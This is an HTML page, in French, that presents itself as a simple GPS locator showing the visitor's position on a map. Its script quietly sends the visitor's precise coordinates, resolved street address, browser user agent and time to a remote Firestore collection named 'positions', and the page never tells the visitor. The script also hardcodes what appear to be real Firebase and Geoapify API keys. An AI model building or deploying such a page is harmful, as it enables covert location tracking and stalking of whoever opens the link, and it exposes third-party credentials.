<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>GPS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>
body { margin:0; background:#0f172a; color:white; text-align:center; font-family:Arial; }
button { margin:20px; padding:15px; font-size:18px; border:none; border-radius:10px; background:#3b82f6; color:white; }
#map { height:60vh; }
</style>
</head>

<body>

<h2>📍 Localisation</h2>
<button onclick="start()">ACTIVER GPS</button>

<p id="status">En attente...</p>
<p id="address"></p>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

<script>

// ✅ TES VRAIES CLÉS
firebase.initializeApp({
  apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
  authDomain: "mymaponline-d4fcf.firebaseapp.com",
  projectId: "mymaponline-d4fcf",
  storageBucket: "mymaponline-d4fcf.appspot.com",
  messagingSenderId: "294259967332",
  appId: "1:294259967332:web:d81f81f5122ff5ef626671",
  measurementId: "G-4M4S7687W5"
});

const db = firebase.firestore();

let map = null;
let marker = null;

function start() {

  const status = document.getElementById("status");

  if (location.protocol !== "https:") {
    status.innerText = "❌ PAS HTTPS";
    return;
  }

  if (!navigator.geolocation) {
    status.innerText = "❌ GPS non supporté";
    return;
  }

  status.innerText = "Demande GPS...";

  navigator.geolocation.getCurrentPosition(success, error, {
    enableHighAccuracy: true,
    timeout: 20000,
    maximumAge: 0
  });
}

async function success(pos) {

  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;

  document.getElementById("status").innerText = "✅ GPS OK";

  // MAP
  if (!map) {
    map = L.map('map').setView([lat, lon], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
      .addTo(map);

    marker = L.marker([lat, lon]).addTo(map);
  } else {
    map.setView([lat, lon]);
    marker.setLatLng([lat, lon]);
  }

  // GEOAPIFY
  let address = "Inconnue";

  try {
    const res = await fetch(
      `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`
    );

    const data = await res.json();
    address = data.features?.[0]?.properties?.formatted || "Inconnue";

  } catch(e){}

  document.getElementById("address").innerText = address;

  // FIREBASE
  db.collection("positions").add({
    lat: lat,
    lon: lon,
    address: address,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  });
}

function error(err) {

  const status = document.getElementById("status");

  if (err.code === 1) {
    status.innerText = "❌ REFUSÉ PAR NAVIGATEUR";
  } else if (err.code === 2) {
    status.innerText = "❌ POSITION INDISPONIBLE";
  } else if (err.code === 3) {
    status.innerText = "❌ TIMEOUT";
  } else {
    status.innerText = "❌ ERREUR";
  }

  console.log(err);
}

</script>

</body>
</html>
